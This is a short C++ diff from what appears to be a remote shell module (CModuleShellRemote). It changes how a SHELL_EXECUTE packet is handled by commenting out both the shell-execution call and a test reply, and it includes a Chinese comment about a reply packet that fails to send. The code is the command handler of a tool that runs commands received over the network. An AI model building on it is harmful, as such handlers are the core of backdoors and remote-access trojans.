@@ -19,10 +19,11 @@ void CModuleShellRemote::OnRecvivePacket(CPacket* pPacket) {
 		
 	case SHELL_EXECUTE: {
 		//MessageBox(0, (WCHAR*)pPacket->m_pbPacketBody, L"", 0);
-		//ExecuteShell((WCHAR*)pPacket->m_pbPacketBody);
+		
+		//ExecuteShell((WCHAR*)pPacket->m_pbPacketBody);			// 能拿到运行结果，但是包就是发不出去。。。。// 但是注释此行，运行下面两行的，这个包能发出去。
 
-		WCHAR pszData[30] = L"I am the test!";
-		pPacket->m_pSocketClient->SendPacket(SHELL_EXECUTE, (PBYTE)pszData, 30);
+		//WCHAR pszData[30] = L"I am the test!";
+		//pPacket->m_pSocketClient->SendPacket(SHELL_EXECUTE, (PBYTE)pszData, 30);
 		break;
 	}
 		
